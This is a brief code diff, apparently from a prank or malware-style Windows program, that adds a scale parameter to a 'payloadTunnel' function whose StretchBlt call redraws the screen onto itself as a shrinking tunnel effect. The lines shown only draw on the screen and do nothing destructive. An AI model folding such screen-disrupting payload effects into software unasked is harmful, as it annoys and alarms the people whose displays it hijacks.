@@ -74,9 +74,9 @@ PAYLOAD payloadGlitch() {
 	FreeHDCs
 }
 
-PAYLOAD payloadTunnel() {
+PAYLOAD payloadTunnel(int scale) {
 	InitHDCs
-	StretchBlt(hdc, 50, 50, rekt.right - 100, rekt.bottom - 100, hdc, 0, 0, rekt.right, rekt.bottom, SRCCOPY);
+	StretchBlt(hdc, scale, scale, rekt.right - scale*2, rekt.bottom - scale*2, hdc, 0, 0, rekt.right, rekt.bottom, SRCCOPY);
 	FreeHDCs
 }
 
